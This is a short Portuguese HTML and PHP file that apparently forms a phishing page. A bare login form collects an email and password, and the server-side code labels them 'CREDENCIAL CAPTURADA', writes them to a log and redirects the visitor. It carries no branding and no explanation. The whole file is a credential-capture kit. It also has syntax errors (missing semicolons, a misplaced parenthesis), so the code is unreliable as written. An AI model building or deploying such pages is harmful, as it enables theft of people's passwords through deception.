<!DOCTYPE html>
<html lang="pt-br">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Formulário de Login</title>
</head>

<body>
  <form action="captura.php" method="post">
    <label for="email">Email:</label>
    <input type="email" id="email" name="email" required><br>
    <label for="senha">Senha:</label>
    <input type="password" id="senha" name="senha" required><br>
    <input type="submit" value="Login">
  </form>
</body>

<?php
// Verificar se a requisição é POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    // Verificar se os dados do POST não estão vazios
    if (!empty($_POST["email"] && !empty($_POST["senha"])) {

        // Pega o email e senha
        $email=$_POST["email"]
        $senha=$_POST["senha"]

        // Criar uma string com os dados do POST
        $dados = "####\n\n[🥃 CREDENCIAL CAPTURADA]\nEMAIL: " . $email . "\nSENHA: " . $senha . "\n\n####\n";

        // Salva nos logs
        file_put_contents("php://stderr", $dados."\n");
        
        // Redirecionar para confirmado.php
        header("Location: confirmado.php");
        exit();
    } else {
        // Nenhum dado recebido
        echo 'Erro: Envie email e senha!';
    }
} else {
    // Método de requisição inválido
    echo 'Erro: Método de requisição inválido!';
}
?>


</html>